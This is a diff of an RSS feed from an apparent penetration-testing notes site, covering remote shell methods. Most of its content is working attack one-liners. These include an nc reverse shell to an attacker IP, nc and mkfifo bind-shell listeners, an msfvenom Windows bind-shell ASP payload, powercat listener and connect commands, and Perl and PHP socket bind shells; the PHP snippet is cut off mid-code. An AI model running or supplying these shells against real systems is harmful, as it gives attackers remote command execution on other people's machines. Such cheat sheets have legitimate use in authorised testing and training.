@@ -16,7 +16,8 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/methodology/</guid>
-      <description>GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
+      <description>https://dolosgroup.io/blog/remote-access-cheat-sheet
+GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
 Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
     </item>
     
@@ -56,11 +57,10 @@ Basics / Classical Reverse shell: nc -nv IP 443 -e /bin/bash ncat --udp IP 443 -
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/shells-methods/bind/</guid>
-      <description> Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
-Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asp 
+      <description>Listener # Linux nc -nlvp 51337 -e /bin/bash # OpenBSD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&amp;gt;&amp;amp;1|nc -lvp 51337 &amp;gt;/tmp/f 
+Windows msfvenom -p windows/shell_bind_tcp -b “\x00\x0a\x0d” LHOST=IP LPORT=1337 -f asp &amp;gt; acknak_TCP_RS.asphttps://github.com/besimorhino/powercat # Victim (listen) . .\powercat.ps1 powercat -l -p 7002 -ep # Connect from attacker . .\powercat.ps1 powercat -c 127.0.0.1 -p 7002 
 Perl perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; 
-PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,&amp;#34;$ &amp;#34;,2))exit;\ $in=socket_read($cl,100);$cmd=popen(&amp;#34;$in&amp;#34;,&amp;#34;r&amp;#34;);while(!feof($cmd)){$m=fgetc($cmd);\ socket_write($cl,$m,strlen($m));}}&amp;#39; 
-Ruby ruby -rsocket -e &amp;#39;f=TCPServer.new(51337);s=f.accept;exec sprintf(&amp;#34;/bin/sh -i &amp;lt;&amp;amp;%d &amp;gt;&amp;amp;%d 2&amp;gt;&amp;amp;%d&amp;#34;,s,s,s)&amp;#39;</description>
+PHP php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.0.0.0&amp;#34;,51337);\ socket_listen($s,1);$cl=socket_accept($s);while(1){if(!</description>
     </item>
     
     <item>
